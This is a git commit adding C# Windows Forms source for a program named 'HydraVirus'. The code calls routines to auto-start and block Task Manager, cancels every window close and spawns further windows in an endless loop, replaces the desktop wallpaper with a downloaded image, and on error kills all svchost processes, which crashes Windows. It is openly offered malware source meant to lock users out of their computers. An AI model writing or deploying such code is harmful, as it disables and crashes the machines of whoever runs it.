94c0869b6592cde2d63855dd97b1eb6f03903435
Pralka53 <79445105+Pralka53@users.noreply.github.com>
2021-11-28 00:11:00 +0100

    Add files via upload

---
+++ HydraVirus/Form1.cs
@@ -0,0 +1,106 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using static HydraVirus.WallpaperMgr;
+
+namespace HydraVirus
+{
+    public partial class Form1 : Form
+    {
+
+        public Form1()
+        {
+            InitializeComponent();
+            Payload Payload = new Payload();
+
+            Payload.AutoStart();
+            Payload.BlockTaskMgr();
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            Random random = new Random();
+            int x = random.Next(0, 1270);
+            int y = random.Next(0, 920);
+
+            e.Cancel = true;
+            Form2 frm2 = new Form2();
+            frm2.StartPosition = FormStartPosition.Manual;
+            frm2.Location = new Point(x, y);
+            frm2.Show();
+            Form3 frm3 = new Form3();
+            frm3.StartPosition = FormStartPosition.Manual;
+            frm3.Location = new Point(x, y);
+            frm3.Show();
+            Form4 frm4 = new Form4();
+            frm4.StartPosition = FormStartPosition.Manual;
+            frm4.Location = new Point(x, y);
+            frm4.Show();
+            StartPayload();
+        }
+
+        public void StartPayload()
+        {
+            WallpaperMgr WallpaperMgr = new WallpaperMgr();
+            Payload Payload = new Payload();
+
+            try
+            {
+                Payload.OpenDisck();
+                string result = Path.GetTempPath();
+                using (WebClient webClient = new WebClient())
+                {
+                    webClient.DownloadFile("https://wallpaperaccess.com/full/844221.jpg", string.Format(result + "\\844221.jpg", Guid.NewGuid().ToString()));
+                }
+                Set(result + "\\844221.jpg", Style.Stretched);
+                new Thread(() =>
+                {
+                    Thread.Sleep(30000);
+                    WindowSpam();
+                }).Start();
+            }
+            catch (Exception ex) 
+            {
+                Process[] processes = Process.GetProcessesByName("svchost");
+                foreach (var proc in processes)
+                {
+                    proc.Kill();
+                }
+            }
+        }
+
+        public void WindowSpam()
+        {
+            while (true)
+            {
+                Random random = new Random();
+                int x = random.Next(0, 1270);
+                int y = random.Next(0, 920);
+
+                Form2 frm2 = new Form2();
+                frm2.StartPosition = FormStartPosition.Manual;
+                frm2.Location = new Point(x, y);
+                frm2.Show();
+                Form3 frm3 = new Form3();
+                frm3.StartPosition = FormStartPosition.Manual;
+                frm3.Location = new Point(x, y);
+                frm3.Show();
+                Form4 frm4 = new Form4();
+                frm4.StartPosition = FormStartPosition.Manual;
+                frm4.Location = new Point(x, y);
+                frm4.Show();
+            }
+        }
+    }
+}
---
+++ HydraVirus/Form2.cs
@@ -0,0 +1,42 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace HydraVirus
+{
+    public partial class Form2 : Form
+    {
+        public Form2()
+        {
+            this.Hide();
+            InitializeComponent();
+        }
+
+        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            Random random = new Random();
+            int x = random.Next(0, 1270);
+            int y = random.Next(0, 920);
+
+            e.Cancel = true;
+            Form3 frm3 = new Form3();
+            frm3.StartPosition = FormStartPosition.Manual;
+            frm3.Location = new Point(x, y);
+            frm3.Show();
+            Form1 frm1 = new Form1();
+            frm1.StartPosition = FormStartPosition.Manual;
+            frm1.Location = new Point(x, y);
+            frm1.Show();
+            Form4 frm4 = new Form4();
+            frm4.StartPosition = FormStartPosition.Manual;
+            frm4.Location = new Point(x, y);
+            frm4.Show();
+        }
+    }
+}
